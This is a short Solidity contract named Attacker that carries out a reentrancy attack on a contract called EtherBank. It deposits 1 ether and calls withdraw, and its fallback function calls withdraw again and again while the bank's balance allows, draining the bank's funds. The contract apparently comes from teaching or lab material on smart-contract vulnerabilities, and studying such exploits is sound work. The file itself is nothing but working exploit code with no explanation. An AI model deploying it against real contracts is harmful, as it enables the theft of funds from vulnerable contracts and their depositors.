contract Attacker {
    EtherBank public etherBank;
    
    constructor(address _etherBankAddress) {
        etherBank = EtherBank(_etherBankAddress);
    }
    
    function attack() public payable {
        require(msg.value >= 1 ether);
        etherBank.deposit{ value: 1 ether}();
        etherBank.withdraw(1 ether);
    }

    fallback() external payable {
        if(address(etherBank).balance >= 1 ether){
            etherBank.withdraw(1 ether);
        }
    }
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
